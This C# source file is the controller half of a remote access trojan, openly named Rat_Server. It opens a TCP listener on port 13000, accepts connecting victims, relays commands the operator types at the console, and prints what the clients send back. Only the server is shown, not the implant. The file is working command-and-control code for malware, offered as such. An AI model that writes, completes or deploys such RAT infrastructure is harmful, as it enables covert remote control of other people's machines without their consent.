using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Rat_Server
{
	class RATSession
	{
		private NetworkStream stream { get; set; }

		public void Start(TcpClient client)
		{
			stream = client.GetStream();

			try
			{
				Thread receiveThread = new Thread(ReceiveLoop);
				receiveThread.Start();

				while (true)
				{
					Console.Write("Command: ");
					string command = Console.ReadLine();
					Send(command);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Session ended: " + ex.Message);
				Stop();
			}
		}

		private void ReceiveLoop()
		{
			try
			{
				while (true)
				{
					string[] input = Receive();
					Console.WriteLine(string.Join(" ", input));
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Receiving ended: " + ex.Message);
				Stop();
			}
		}

		public void Stop()
		{
			stream.Close();
		}

		public string[] Receive()
		{
			byte[] bytes = new byte[1024];
			int bytesRead = stream.Read(bytes, 0, bytes.Length);

			stream.Flush();

			return Encoding.ASCII.GetString(bytes, 0, bytesRead).Split('|');
		}

		public void Send(string data)
		{
			byte[] bytes = Encoding.ASCII.GetBytes(data + "|");

			stream.Write(bytes, 0, bytes.Length);
		}
	}

	class RATServer
	{
		private static RATSession currentSession { get; set; }

		static void Main()
		{
			TcpListener listener = new TcpListener(IPAddress.Any, 13000);
			listener.Start();
			Console.WriteLine("Server started on port 13000.");

			while (true)
			{
				TcpClient client = listener.AcceptTcpClient();
				Console.WriteLine("A client has connected.");

				RATSession session = new RATSession();
				currentSession = session;

				Thread sessionThread = new Thread(() => session.Start(client));
				sessionThread.Start();
			}
		}
	}
}
